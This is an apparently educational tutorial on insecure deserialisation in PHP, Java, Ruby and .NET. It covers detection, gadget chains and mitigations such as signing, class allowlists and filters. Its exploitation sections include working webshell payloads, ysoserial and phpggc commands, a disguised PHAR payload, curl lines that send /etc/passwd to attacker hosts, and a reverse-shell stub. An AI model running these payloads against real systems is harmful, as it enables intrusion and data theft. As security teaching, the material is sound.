# Insecure Deserialization

Insecure deserialization is consistently ranked among the most critical and impactful vulnerability classes in web application security because it uniquely enables an attacker to leverage the application's own existing code against itself — rather than injecting new malicious code, an attacker crafts a manipulated serialized object that causes the application's legitimate classes and methods to execute dangerous operations when they process the tampered data, often achieving remote code execution through chains of otherwise-innocuous method calls that are weaponised by controlling the data they operate on. The severity stems from a fundamental architectural danger: any application endpoint that accepts and deserialises user-controlled data is handing an attacker the ability to instantiate arbitrary objects of any class available in the application's dependency tree, invoke magic methods that execute automatically during deserialisation without any explicit call from application logic, and chain together method invocations across libraries and frameworks into a sequence that ultimately passes attacker-controlled data into a dangerous sink — all before the application's own validation code ever executes. Unlike many vulnerability classes where the impact is bounded by the functionality of a single endpoint, insecure deserialisation's impact is bounded only by the classes available in the application's entire codebase and all its dependencies — a virtually unbounded attack surface that makes it extraordinarily difficult to fully remediate through defensive measures alone. 

The fundamental principle: **the vulnerability is the act of deserialising untrusted data — not the presence or absence of gadget chains. Eliminating found gadget chains provides no durable protection because new chains can always be constructed from dependencies; only eliminating deserialisation of user input addresses the root cause.** 

## Serialisation and Deserialisation Explained

### What serialisation does and why it exists

**The serialisation process — converting objects to bytes:**

```
In-memory object (complex, language-specific structure):
┌─────────────────────────────────┐
│ User Object                     │
│   username: "carlos"            │
│   isAdmin: false                │
│   email: "carlos@example.com"   │
│   sessionExpiry: 1708300800     │
│   private: password_hash: "..." │
└─────────────────────────────────┘

Cannot be directly:
→ Stored in a cookie (cookies are strings)
→ Written to a file (files store bytes/text)
→ Sent over a network (network transmits byte streams)
→ Passed between processes (each process has its own memory)

Serialisation = flatten to a transmissible byte stream:
O:4:"User":4:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;
s:5:"email";s:19:"carlos@example.com";s:13:"sessionExpiry";i:1708300800;}

This flattened representation:
→ Can be stored in a cookie string ✓
→ Can be written to a database ✓
→ Can be sent in an HTTP request ✓
→ Can be cached on disk ✓

Deserialisation = restore to original in-memory object:
Server receives serialised bytes → calls unserialize() → User object recreated
Application logic interacts with User object as if freshly created
```

**Why the state preservation property is dangerous:**

```
Key property of serialisation:
ALL object attributes are preserved — including private fields!

This means:
→ isAdmin: false is stored in the serialised stream
→ email: "carlos@example.com" is stored
→ password_hash is stored (even private field!)

If an attacker can access the serialised data AND modify it:
→ They can change: isAdmin: false → isAdmin: true
→ They can change: role: "user" → role: "admin"
→ They can change: accessLevel: 1 → accessLevel: 100
→ They can inject entirely different object types!

The application deserialises and trusts this data:
→ if (user->isAdmin) { grantAdminAccess(); }  ← now passes!
→ No re-authentication
→ No privilege check
→ Application logic simply trusts the deserialised state!
```

**Serialisation terminology across languages:**

```
Language       | Serialise       | Deserialise    | Format
---------------|-----------------|----------------|------------------
PHP            | serialize()     | unserialize()  | Custom text format
Java           | Serializable    | readObject()   | Binary (AC ED...)
Python         | pickle.dumps()  | pickle.loads() | Binary protocol
Ruby           | Marshal.dump()  | Marshal.load() | Binary format
.NET           | BinaryFormatter | Deserialize()  | Binary/XML
JavaScript     | JSON.stringify()| JSON.parse()   | JSON text

Language-specific terms:
Ruby: "marshalling" / "unmarshalling" — same concept as serialise/deserialise
Python: "pickling" / "unpickling" — same concept
.NET: often called "marshalling" in remoting context
All of these are synonymous in security context: same vulnerability class
```

## How Serialised Data Appears in Applications

### Identifying serialised data in transit

**PHP serialisation format:**

```php
// Original PHP object:
class User {
    public $username = 'carlos';
    public $isAdmin = false;
    public $role = 'user';
    public $loginCount = 42;
    public $email = 'carlos@normal-website.com';
}

// PHP serialised representation:
// serialize(new User())
O:4:"User":5:{
    s:8:"username"; s:6:"carlos";
    s:7:"isAdmin";  b:0;
    s:4:"role";     s:4:"user";
    s:10:"loginCount"; i:42;
    s:5:"email";    s:25:"carlos@normal-website.com";
}

// PHP serialisation format tokens:
O:n:"ClassName":count:{...}  — Object, n=length of class name, count=properties
s:n:"value"                  — String, n=byte length of string
i:n                          — Integer value n
b:0 / b:1                    — Boolean false / true
d:n                          — Float/double value n
a:n:{...}                    — Array with n elements
N                            — NULL value
r:n                          — Reference to property n

// Commonly found in:
// → HTTP cookies (Base64-encoded)
// → POST body parameters
// → Hidden form fields
// → JSON fields containing serialised sub-objects
// → API request parameters
```

**Where to look for serialised data:**

```
HTTP Cookies:
Set-Cookie: session=TzozOiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6ImNhcmxvcyI7czo3OiJpc0FkbWluIjtiOjA7czo0OiJyb2xlIjtzOjQ6InVzZXIiO30=
→ Base64 decode this cookie value!
→ TzozOiJVc2VyIj... decodes to: O:4:"User":3:{...}  ← PHP serialised object!

HTTP request parameters:
POST /profile HTTP/1.1
data=TzozOiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6...

Hidden form fields:
<input type="hidden" name="userData" value="O:4:%22User%22...">

Java serialised objects — binary format signature:
AC ED 00 05        ← Magic bytes identifying Java serialisation
After Base64:      rO0AB...  (Java serialised objects in Base64 start with rO0)
In HTTP headers: Cookie: session=rO0ABXNyAA...

.NET serialised objects:
AAEAAAD/////...   (BinaryFormatter Base64 signature)
Or XML: <SOAP-ENV:Envelope...> (SOAP/XML serialisation)

Detection in Burp Suite:
→ Decode Base64-encoded values in all parameters
→ PHP: look for O:, a:, s:, i:, b: patterns
→ Java: look for AC ED 00 05 bytes or rO0A in Base64
→ Python: look for \x80\x02 or \x80\x03 (pickle magic bytes)
→ Ruby Marshal: look for \x04\x08 (Marshal magic bytes)
```

## Exploitation — From Concept to Attack

### Level 1: Modifying primitive attribute values

**The simplest insecure deserialisation attack:** 

```
Scenario:
Application stores user session as PHP serialised object in cookie

Original cookie (Base64-decoded):
O:4:"User":3:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;s:4:"role";s:4:"user";}

Server-side code (vulnerable):
$user = unserialize($_COOKIE['session']);    // Deserialise from cookie!

if ($user->isAdmin === true) {
    // Grant access to admin interface
    showAdminPanel();
}
// Problem: isAdmin comes from the COOKIE — attacker-controlled!
// No integrity check on the deserialised data

Attack — modify the serialised object directly:
Step 1: Decode cookie from Base64
Step 2: Modify isAdmin field: b:0 → b:1
O:4:"User":3:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:1;s:4:"role";s:4:"user";}
                                                                      ↑ Changed to true!
Step 3: Re-encode to Base64
Step 4: Replace cookie value with modified version

Result:
→ unserialize() creates User object with isAdmin = true
→ if ($user->isAdmin === true) → PASSES
→ Admin panel accessible!

This is a complete privilege escalation exploit with zero knowledge of the
application's backend code — just basic understanding of PHP serialisation format
```

**Modifying data types — type juggling:** 

```
PHP type juggling via deserialisation:

Vulnerable comparison code:
$user = unserialize($_COOKIE['session']);
if ($user->accessCode == $secretCode) {
    // Grant access — using loose comparison (==) not (===)!
    grantAccess();
}

PHP loose comparison (==) type juggling:
0 == "any string starting with a non-numeric character"  → TRUE!
0 == "carlos"    → TRUE (PHP coerces "carlos" to integer 0)
0 == "admin"     → TRUE
100 == "100abc"  → TRUE (string parsed as integer)
true == "any non-empty string"  → TRUE

Attack:
Change the integer accessCode field to integer 0:
Original: s:10:"accessCode";s:4:"s3cr"   ← String comparison
Attack:   s:10:"accessCode";i:0           ← Integer 0

PHP evaluates: 0 == "s3cr" → TRUE (via type juggling!)
Access granted without knowing the real access code!

Fix: Always use === (strict comparison) in PHP, never ==
if ($user->accessCode === $secretCode) { // Strict type + value comparison
```

**Modifying string lengths — critical syntax rule:**

```
PHP serialisation MUST have accurate byte counts!

Original field:
s:8:"username";s:6:"carlos";
    ↑ 8 bytes      ↑ 6 bytes

If you change the value, you MUST update the byte count:
Want to change username from "carlos" to "administrator":
WRONG:   s:8:"username";s:6:"administrator";   ← 13 bytes, says 6!
CORRECT: s:8:"username";s:13:"administrator";  ← Must match!

Failing to update byte count:
→ unserialize() will fail or behave unexpectedly
→ Attack fails silently
→ Always recount bytes after modifying string values
→ Note: s: counts bytes, not characters (multi-byte UTF-8 chars count > 1)
```

### Level 2: Using application functionality against itself

**Weaponising dangerous operations triggered by deserialised data:** 

```
Scenario:
Delete user functionality deletes profile picture by accessing file path in object:

PHP class definition:
class User {
    public $username;
    public $image_location;   // File path to profile image
}

Application code for delete functionality:
$user = unserialize($_COOKIE['session']);
// When deleting account — delete the profile picture
if ($deleteAccountRequested) {
    unlink($user->image_location);  // Delete file at stored path!
}

Normal serialised session:
O:4:"User":2:{s:8:"username";s:6:"carlos";s:14:"image_location";s:30:"images/users/carlos/avatar.jpg";}

Attack — modify image_location to target critical system file:
O:4:"User":2:{s:8:"username";s:6:"carlos";s:14:"image_location";s:23:"/home/carlos/.ssh/id_rsa";}
                                                                             ↑ Attacker's target file!

Flow:
1. Replace cookie with modified serialised object
2. Trigger "Delete Account" functionality
3. Application deserialises cookie → User object with attacker's path
4. unlink("/home/carlos/.ssh/id_rsa") executes!
5. Target file deleted — arbitrary file deletion!

Extend to any file:
→ /etc/cron.d/daily_backup → delete backup jobs
→ Application config files → break application
→ /var/www/html/index.php  → deface site (if writable)
→ Any file the web server process can access!

Key insight:
Attacker didn't write any code
Attacker used the application's own "delete file" functionality
The dangerous operation was legitimate — just given wrong data
This is the "object injection" / "data-driven attack" model
```

### Level 3: Magic methods and automatic execution

**Why magic methods make deserialisation uniquely dangerous:** 

```
Magic methods = special methods that execute AUTOMATICALLY
in response to specific events — without explicit calls

PHP magic methods:
__construct()    — Runs when object is CREATED
__destruct()     — Runs when object is DESTROYED (end of scope/script)
__toString()     — Runs when object is CONVERTED TO STRING
__sleep()        — Runs just BEFORE serialisation
__wakeup()       — Runs just AFTER deserialisation ← Attacker entry point!
__get($name)     — Runs when accessing UNDEFINED PROPERTY
__set($n, $v)    — Runs when SETTING UNDEFINED PROPERTY
__call($n, $a)   — Runs when calling UNDEFINED METHOD
__invoke()       — Runs when OBJECT USED AS FUNCTION

__wakeup() is the critical one for deserialisation attacks:

class FileLogger {
    public $logFile;
    public $logMessage;

    public function __wakeup() {
        // Automatically runs when this object is deserialised!
        file_put_contents($this->logFile, $this->logMessage);
        // Writes $this->logMessage to $this->logFile
    }
}

If attacker can inject this object type:
O:10:"FileLogger":2:{s:7:"logFile";s:30:"/var/www/html/shell.php";
                     s:10:"logMessage";s:35:"<?php system($_GET['cmd']); ?>";}

When deserialised:
1. FileLogger object instantiated
2. __wakeup() fires AUTOMATICALLY
3. file_put_contents("/var/www/html/shell.php", "<?php system($_GET['cmd']); ?>");
4. PHP webshell written to web root!
5. Access: https://victim.com/shell.php?cmd=whoami
→ REMOTE CODE EXECUTION!

The attack completes inside the deserialisation process itself
Application code that runs AFTER unserialize() is irrelevant
The payload already executed!
```

**Java magic methods — readObject() and equivalents:**

```java
// Java serialisation magic method:
// readObject() is called automatically during deserialisation

public class VulnerableClass implements Serializable {
    private String command;

    private void readObject(ObjectInputStream in)
            throws IOException, ClassNotFoundException {
        // Automatically called during deserialisation!
        in.defaultReadObject();
        Runtime.getRuntime().exec(this.command);  // Execute command!
    }
}

// If attacker can create and submit serialised VulnerableClass:
// → readObject() fires during deserialization
// → Runtime.getRuntime().exec() called with attacker's command
// → Remote code execution!

// Java readObject equivalent magic methods:
// readResolve()     — Called after readObject(), can substitute object
// readExternal()    — Called for Externalizable objects
// validateObject()  — Called after full graph deserialised

// Other Java auto-execution methods (for gadget chains):
// equals(), hashCode() — called when used in HashMap/HashSet
// compareTo()          — called when used in TreeMap/TreeSet
// toString()           — called in string contexts
// finalize()           — called by garbage collector (deprecated)
```

**Ruby marshal methods:** 

```ruby
# Ruby's Marshal.load() magic method:
# marshal_load called automatically during deserialisation

class MaliciousObject
    def marshal_load(data)
        # Called automatically when Marshal.load processes this object!
        eval(data['code'])  # Execute arbitrary Ruby code!
    end
end

# Real-world: Gem::Requirement gadget chain (first public Ruby RCE chain)
# Uses: marshal_load → Gem::DependencyList#each → Gem::Installer#run_requirements
#       → system() call with attacker-controlled arguments

# Ruby RCE gadget chain structure:
Gem::Requirement.new
  └── marshal_load fires
        └── calls Gem::DependencyList#each
              └── triggers Gem::SourceIndex or similar
                    └── eventually reaches: Kernel#system(attacker_command)
```

### Level 4: Gadget Chains

**How gadget chains weaponise legitimate library code:** 

```
What is a "gadget"?
A gadget = a snippet of existing application/library code that:
1. Can be invoked during or after deserialisation
2. Operates on data that the attacker can control
3. Either causes harm directly OR passes data to another gadget

What is a "gadget chain"?
A gadget chain = a sequence of gadgets where:
→ Entry point gadget: triggered automatically (magic method)
→ Each subsequent gadget: invoked by the previous one
→ Final gadget (sink): performs the dangerous operation

Gadget chain conceptual flow:

[Attacker submits serialised object]
        ↓
[deserialise(): Object instantiated]
        ↓
[__wakeup()/__destruct()/readObject(): Entry gadget fires AUTOMATICALLY]
        ↓
[Gadget 1: Calls method on attacker-controlled object attribute]
        ↓
[Gadget 2: That method calls another method in a different class]
        ↓
[Gadget 3: That method processes attacker-controlled string data]
        ↓
[Sink gadget: exec() / Runtime.exec() / eval() / file_write()]
        ↓
[REMOTE CODE EXECUTION with web server privileges]

Key properties:
→ Every class in the chain is LEGITIMATE — no malicious code exists in app!
→ Chain is assembled from library dependencies (Apache Commons, Spring, etc.)
→ Attacker controls DATA, not code — the code paths already exist
→ Attack works even if application itself has no dangerous code
```

**Java gadget chain example — Apache Commons Collections:** 

```java
// Apache Commons Collections (ACC) gadget chain — historical example
// Affected: WebLogic, WebSphere, JBoss, Jenkins, OpenNMS

// Chain overview (simplified):
// 1. InvokerTransformer — calls any method on any object via reflection
// 2. ChainedTransformer — chains multiple transformers
// 3. LazyMap — triggers transformation when key not found
// 4. AnnotationInvocationHandler — calls Map.get() in readObject()

// Assembled chain:
Transformer[] transformers = {
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[] {String.class, Class[].class},
        new Object[] {"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[] {Object.class, Object[].class},
        new Object[] {null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[] {String.class},
        new Object[] {"curl https://attacker.com/rce-confirmed"}),  // PAYLOAD
    new ConstantTransformer(1)
};

ChainedTransformer chain = new ChainedTransformer(transformers);

// Wrapped in LazyMap and AnnotationInvocationHandler...
// When the AnnotationInvocationHandler's readObject() fires:
// → equals() called on LazyMap
// → LazyMap.get() triggers ChainedTransformer
// → Chain executes Runtime.getRuntime().exec("curl attacker.com")
// → REMOTE CODE EXECUTION!

// No application code is malicious
// Every class is from legitimate Apache Commons Collections library
// Attack requires only that commons-collections.jar is on the classpath
```

**PHP gadget chain construction:** 

```php
// Realistic PHP gadget chain components:

// Gadget 1 (Entry point): __destruct in database class
class DatabaseConnection {
    public $connection;
    public $query;

    public function __destruct() {
        // Runs when object garbage collected (end of script)!
        $this->connection->execute($this->query);
        // Calls execute() on whatever $this->connection is!
    }
}

// Gadget 2 (Bridge): A class with execute() that does something dangerous
class FileSystemHelper {
    public function execute($data) {
        // Writes to filesystem when execute() is called
        file_put_contents($this->path, $data);
    }
    public $path;
}

// Attacker constructs the chain:
$fileHelper = new FileSystemHelper();
$fileHelper->path = '/var/www/html/shell.php';

$dbConn = new DatabaseConnection();
$dbConn->connection = $fileHelper;      // FileSystemHelper as "connection"!
$dbConn->query = '<?php system($_GET["cmd"]); ?>';  // Webshell as "query"!

$payload = serialize($dbConn);

// When deserialised:
// 1. DatabaseConnection instantiated
// 2. Script ends → __destruct() fires
// 3. $this->connection->execute($this->query)
//    → FileSystemHelper->execute('<?php system($_GET["cmd"]); ?>')
// 4. file_put_contents('/var/www/html/shell.php', '<?php system(...) ?>')
// 5. Webshell written → Remote Code Execution!

// Attacker submits: Cookie: session=Tzo....[base64 of serialized chain]
```

**Using automated tools for gadget chain generation:** 

```
ysoserial (Java gadget chain generator):
→ Pre-built, tested gadget chains for common Java libraries
→ Usage: java -jar ysoserial.jar [chain] [command]

Available chains (subset):
CommonsCollections1   — Apache Commons Collections 3.1
CommonsCollections2   — Apache Commons Collections 4.0
Spring1               — Spring Framework
Spring2               — Spring Framework (alternative)
Groovy1               — Apache Groovy
Jdk7u21               — JDK 7u21 (no extra libraries!)
URLDNS                — DNS lookup only (detection without RCE)
JRMPClient            — Java RMI exploit
Hibernate1            — Hibernate ORM
Wicket1               — Apache Wicket

Example: Generate payload for Commons Collections 1, execute curl:
java -jar ysoserial.jar CommonsCollections1 'curl http://attacker.com/pwned' > payload.bin
# Base64 encode:
base64 payload.bin > payload.b64
# Submit in cookie/parameter

URLDNS chain — for detection only (safe to test):
java -jar ysoserial.jar URLDNS 'http://COLLABORATOR_URL' > detection.bin
# Submit this → if DNS callback received: Java deserialisation confirmed!
# No code execution risk — useful for initial detection

phpggc (PHP gadget chain generator — "PHP ysoserial"):
→ Pre-built chains for common PHP frameworks
Supported frameworks: Laravel, Symfony, Zend, Magento, WordPress, Drupal, Yii

Example:
phpggc Laravel/RCE1 system 'id'
phpggc Symfony/RCE4 exec 'curl attacker.com'
phpggc -b Laravel/RCE1 system 'whoami'   # -b for Base64 output
```

### Level 5: PHP Object Injection via PHAR

**File operation functions as deserialisation triggers:** 

```php
// PHAR (PHP Archive) files contain serialised metadata!
// PHP functions that work on files will deserialise PHAR metadata:

// Triggered by ANY of these functions (not just unserialize()!):
file_exists('phar://uploaded.jpg')   // ← Triggers PHAR deserialisation!
file_get_contents('phar://...')      // ← Triggers!
include('phar://...')                // ← Triggers!
fopen('phar://...')                  // ← Triggers!
is_file('phar://...')                // ← Triggers!
mkdir('phar://...')                  // ← Triggers!
rename('phar://...')                 // ← Triggers!
file_put_contents('phar://...')      // ← Triggers!
// Any filesystem function with phar:// URL!

PHAR attack scenario:
1. Application allows file upload (images, PDFs, etc.)
2. Attacker uploads a crafted PHAR file disguised as image.jpg
   (PHAR file with malicious gadget chain in serialised metadata)
   (File passes MIME/extension checks — looks like a JPEG!)
3. Application later passes attacker-controlled filename to any file function:
   file_exists('/uploads/' . $_GET['file'])
4. Attacker requests: ?file=phar://uploads/evil.jpg
5. file_exists() triggers PHAR deserialisation of evil.jpg metadata!
6. Gadget chain executes → RCE!

Creating a PHAR payload:
<?php
// Objects for gadget chain (same as standard PHP object injection)
class MaliciousWakeup {
    public $command = 'curl https://attacker.com/rce';
    public function __wakeup() { system($this->command); }
}

// Pack into PHAR:
$phar = new Phar('evil.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'test');
// Serialised gadget chain goes into PHAR metadata:
$phar->setMetadata(new MaliciousWakeup());
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
rename('evil.phar', 'evil.jpg');  // Disguise as image!
```

## Complete Exploitation Methodology

### Structured approach to finding and exploiting insecure deserialisation

**Step 1: Detect serialised data in application**

```
Fingerprinting serialised formats:

PHP:
Pattern: O:n:"ClassName":count:{...}
In Base64: starts with characters from the PHP serialise alphabet
Decode any Base64 values and look for O: prefix

Java:
Binary signature: AC ED 00 05 (hex)
Base64 encoded: rO0AB (always starts this way for AC ED 00 05 73...)
Look for: Cookie values, POST parameters starting with rO0A or rO0AB

Python pickle:
Binary: \x80\x02 or \x80\x03 (pickle protocol 2 or 3)
In Base64: looks like gASV (protocol 4 with utf-8 strings)

Ruby Marshal:
Binary: \x04\x08
In Base64: BAh

.NET BinaryFormatter:
Binary: 00 01 00 00 00 FF FF FF FF
In Base64: AAEAAAD

In Burp Suite:
→ Scanner/active scan detects some deserialisation vulnerabilities
→ Manually check: Proxy → HTTP history → all requests
→ Decode Base64 values in cookies, POST bodies, hidden fields
→ Burp extension "Java Deserialization Scanner" for Java targets
```

**Step 2: Test for Java deserialisation (detection only)**

```
Safe detection using ysoserial URLDNS chain:
(URLDNS causes only a DNS lookup — no code execution, safe to test)

1. Generate payload:
java -jar ysoserial.jar URLDNS 'http://UNIQUE_ID.oastify.com' | base64 | tr -d '\n'

2. Replace the value of the suspected serialised field with this payload
3. Submit the request
4. Check Burp Collaborator for DNS interaction

DNS interaction received?
→ Java deserialisation CONFIRMED
→ Proceed with RCE gadget chain testing

No DNS interaction?
→ Either: not Java deserialisation
→ Or: DNS outbound blocked (try HTTP interaction instead)
→ Or: ysoserial format not recognised (try alternative serialisation formats)
```

**Step 3: Identify available gadget chains**

```
With source code access (white-box):
→ Examine pom.xml (Java), composer.json (PHP), Gemfile (Ruby)
→ Identify versions of all dependencies
→ Cross-reference with known gadget chains for those versions
→ ysoserial/phpggc --list to see available chains by library

Without source code (black-box):
→ Try each ysoserial chain systematically with URLDNS first (safe detection)
   java -jar ysoserial.jar CommonsCollections1 'nslookup CC1.oastify.com' | base64
   java -jar ysoserial.jar CommonsCollections2 'nslookup CC2.oastify.com' | base64
   java -jar ysoserial.jar Spring1 'nslookup Spring1.oastify.com' | base64
   // Each has unique subdomain → identifies which library is present!
→ First chain that triggers DNS = the library available on server
→ Use same chain with RCE payload

PHP framework fingerprinting:
→ HTTP response headers may reveal framework (X-Powered-By, error pages)
→ Cookies named "laravel_session" → Laravel
→ phpggc then targets that specific framework
```

**Step 4: Craft and submit exploit**

```
Java RCE via ysoserial (after identifying chain via DNS):
// Chain identified as CommonsCollections1:

// Step 1: Confirm with out-of-band callback
java -jar ysoserial.jar CommonsCollections1 \
  'curl http://COLLABORATOR_URL/confirmed' \
  | base64 | tr -d '\n' > payload_b64.txt

// Step 2: Submit in Burp → verify HTTP callback received

// Step 3: Escalate to meaningful command execution
// Read /etc/passwd (Linux) or whoami:
java -jar ysoserial.jar CommonsCollections1 \
  'curl -d @/etc/passwd http://COLLABORATOR_URL/data' \
  | base64 | tr -d '\n'

// Step 4: Reverse shell (if authorised):
java -jar ysoserial.jar CommonsCollections1 \
  'bash -c {echo,BASE64_REVERSE_SHELL}|{base64,-d}|bash' \
  | base64 | tr -d '\n'

PHP exploit via phpggc:
// Identify framework from cookie name or error pages
// Target: Laravel

// Generate payload:
phpggc -b Laravel/RCE1 system 'id' > payload.txt
// -b = Base64 encode
// system('id') = run id command

// For file write (webshell):
phpggc -b Laravel/RCE1 file_put_contents \
  '/var/www/html/shell.php,<?php system($_GET[cmd]);?>'

// Submit payload as the session cookie value
// If error reveals output → RCE confirmed with output!
// If blind → use curl callback to confirm
```

## Prevention — Eliminating Insecure Deserialisation

### Strategy 1: Avoid deserialising user input entirely (preferred) 

```
The most effective defence: never deserialise untrusted data at all

Replace native serialisation with safer data interchange formats:

Instead of: PHP unserialize($cookie)
Use:         json_decode($cookie)   // JSON — no class instantiation!
             // JSON cannot represent objects with methods — no gadget chains!

Instead of: Java ObjectInputStream.readObject()
Use:         Jackson/Gson JSON parsing:
             ObjectMapper mapper = new ObjectMapper();
             UserData user = mapper.readValue(jsonString, UserData.class);
             // Jackson doesn't execute arbitrary methods during parsing!

Instead of: Python pickle.loads()
Use:         json.loads() or yaml.safe_load()
             // No code execution during JSON/safe YAML parsing

Instead of: Ruby Marshal.load()
Use:         JSON.parse() or MessagePack
             // No arbitrary object graph deserialisation

Why format matters:
JSON: represents only data types (string, number, array, object, bool, null)
      Cannot represent: method references, class instances, arbitrary objects
      Cannot trigger: magic methods, readObject(), eval()
      Attack surface: essentially zero for object injection

PHP unserialize(): Can represent ANY PHP object of ANY class
                   CAN trigger: __wakeup(), __destruct(), __toString()
                   CAN instantiate: any class accessible in the autoloader
                   Attack surface: entire codebase + all dependencies!

If you MUST use serialisation: see defences below
```

### Strategy 2: Integrity verification before deserialisation 

```
If serialised data must be transmitted to clients and back:
Sign the data cryptographically to detect tampering

CRITICAL: Verification MUST happen BEFORE deserialisation!
(Verifying AFTER deserialisation is too late — magic methods already fired!)

PHP — HMAC-based integrity check:
<?php
$secretKey = getenv('SIGNING_SECRET');  // Keep server-side only!

function serializeWithSignature($object) {
    $serialized = serialize($object);
    $signature = hash_hmac('sha256', $serialized, $GLOBALS['secretKey']);
    return base64_encode($signature . ':' . $serialized);
}

function deserializeWithSignature($token) {
    $decoded = base64_decode($token);
    $colonPos = strpos($decoded, ':');
    $receivedSig = substr($decoded, 0, $colonPos);
    $serialized = substr($decoded, $colonPos + 1);

    // VERIFY SIGNATURE BEFORE DESERIALISING!
    $expectedSig = hash_hmac('sha256', $serialized, $GLOBALS['secretKey']);

    if (!hash_equals($expectedSig, $receivedSig)) {
        throw new SecurityException('Tampered serialised data detected!');
        // Attacker modified the object → signature mismatch → REJECTED!
        // unserialize() never called on tampered data!
    }

    return unserialize($serialized);  // Only deserialise if signature valid
}

// Usage:
$cookie = serializeWithSignature($userObject);
setcookie('session', $cookie);

// On request:
try {
    $user = deserializeWithSignature($_COOKIE['session']);
} catch (SecurityException $e) {
    // Log and reject — do not deserialise
    session_destroy();
    die('Invalid session');
}
```

```java
// Java — HMAC signature on serialised data:
import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.util.Base64;

public class SecureSerializer {
    private static final String SECRET_KEY = System.getenv("SIGNING_SECRET");
    private static final String HMAC_ALGO = "HmacSHA256";

    public static byte[] serializeWithSignature(Object obj) throws Exception {
        // Serialize to bytes
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(bos);
        oos.writeObject(obj);
        byte[] serialized = bos.toByteArray();

        // Compute HMAC
        Mac mac = Mac.getInstance(HMAC_ALGO);
        mac.init(new SecretKeySpec(SECRET_KEY.getBytes(), HMAC_ALGO));
        byte[] signature = mac.doFinal(serialized);

        // Return: [signature_length][signature][serialized_data]
        ByteArrayOutputStream combined = new ByteArrayOutputStream();
        combined.write(signature.length);
        combined.write(signature);
        combined.write(serialized);
        return combined.toByteArray();
    }

    public static Object deserializeWithSignature(byte[] data) throws Exception {
        // Extract signature
        int sigLen = data[0];
        byte[] receivedSig = Arrays.copyOfRange(data, 1, 1 + sigLen);
        byte[] serialized = Arrays.copyOfRange(data, 1 + sigLen, data.length);

        // VERIFY BEFORE DESERIALISING!
        Mac mac = Mac.getInstance(HMAC_ALGO);
        mac.init(new SecretKeySpec(SECRET_KEY.getBytes(), HMAC_ALGO));
        byte[] expectedSig = mac.doFinal(serialized);

        if (!MessageDigest.isEqual(receivedSig, expectedSig)) {
            throw new SecurityException("Tampered serialized data!");
            // Never reaches ObjectInputStream.readObject()!
        }

        // Safe to deserialise — data integrity confirmed
        ObjectInputStream ois = new ObjectInputStream(
            new ByteArrayInputStream(serialized)
        );
        return ois.readObject();
    }
}
```

### Strategy 3: Class allowlisting during deserialisation 

```java
// Java — Override resolveClass() to restrict which classes can be deserialised:
public class RestrictedObjectInputStream extends ObjectInputStream {

    // ALLOWLIST: Only these specific classes may be deserialised
    private static final Set<String> ALLOWED_CLASSES = new HashSet<>(Arrays.asList(
        "com.example.models.UserSession",
        "com.example.models.CartItem",
        "java.util.ArrayList",
        "java.lang.String",
        "java.lang.Integer"
    ));

    public RestrictedObjectInputStream(InputStream in) throws IOException {
        super(in);
    }

    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc)
            throws IOException, ClassNotFoundException {

        // Check class name against allowlist BEFORE instantiating!
        if (!ALLOWED_CLASSES.contains(desc.getName())) {
            throw new InvalidClassException(
                "Unauthorised class attempted to deserialise: " + desc.getName()
            );
            // Gadget chain classes (CommonsCollections, etc.) are REJECTED!
        }

        return super.resolveClass(desc);
    }
}

// Usage — replace ObjectInputStream with RestrictedObjectInputStream:
// BEFORE (vulnerable):
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();

// AFTER (protected):
ObjectInputStream ois = new RestrictedObjectInputStream(inputStream);
Object obj = ois.readObject();  // Throws if non-allowlisted class encountered!

// IMPORTANT CAVEATS:
// → Allowlist ALL classes including nested/dependency classes!
// → java.util.ArrayList may itself reference attacker-controlled objects
// → Verify each allowed class cannot be part of a gadget chain
// → This is defence in depth — not a complete solution on its own
```

```php
// PHP — there is no built-in class restriction for unserialize()
// PHP 7+ supports allowed_classes option:
$options = [
    'allowed_classes' => ['UserSession', 'CartItem']
    // Only UserSession and CartItem can be instantiated!
    // All other classes: returned as __PHP_Incomplete_Class
    // Gadget chain classes: blocked!
];
$user = unserialize($cookie, $options);

// Or: reject ALL classes (safest — returns only scalar values/arrays):
$data = unserialize($cookie, ['allowed_classes' => false]);
// All objects converted to StdClass with no methods
// Magic methods cannot fire — no gadget chains possible!

// Verify you actually need class instances from the deserialised data
// If you only need scalar values: allowed_classes => false is ideal
```

### Strategy 4: Runtime monitoring and Java agent-based protection 

```java
// Java serialisation filter (Java 9+ built-in mechanism):
// ObjectInputFilter provides class-level filtering at JVM level

// Set a global filter for all deserialisation in the JVM:
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.models.*;java.util.*;!*"
    // Allow: com.example.models package and java.util package
    // Block: everything else (! = deny)
);

ObjectInputFilter.Config.setSerialFilterFactory((curr, next) -> {
    return filter;
});

// Per-stream filter (more fine-grained):
ObjectInputStream ois = new ObjectInputStream(inputStream);
ois.setObjectInputFilter(info -> {
    if (info.serialClass() == null) {
        return ObjectInputFilter.Status.UNDECIDED;
    }
    String className = info.serialClass().getName();
    if (className.startsWith("com.example.")) {
        return ObjectInputFilter.Status.ALLOWED;
    }
    return ObjectInputFilter.Status.REJECTED;  // Block all other classes!
});

// Third-party Java agent options (don't modify application code):
// → NotSoSerial: agent that enforces class allowlists
// → SerialKiller: replaces ObjectInputStream with restricted version
// → RASP (Runtime Application Self-Protection) solutions
// → These operate at JVM level — protect even legacy code
```

### Strategy 5: Isolate, log, and monitor deserialisation 

```
Isolation:
→ Run deserialisation in a separate process with minimal privileges
→ Container/sandbox: if code executes, damage is contained
→ Linux: run deserialisation worker as dedicated low-privilege user
→ OS-level: seccomp filter to restrict syscalls from deserialisation process
→ Java: SecurityManager (deprecated) or custom ClassLoader isolation

Monitoring and anomaly detection:
→ Log ALL deserialisation events: timestamp, source IP, class names, size
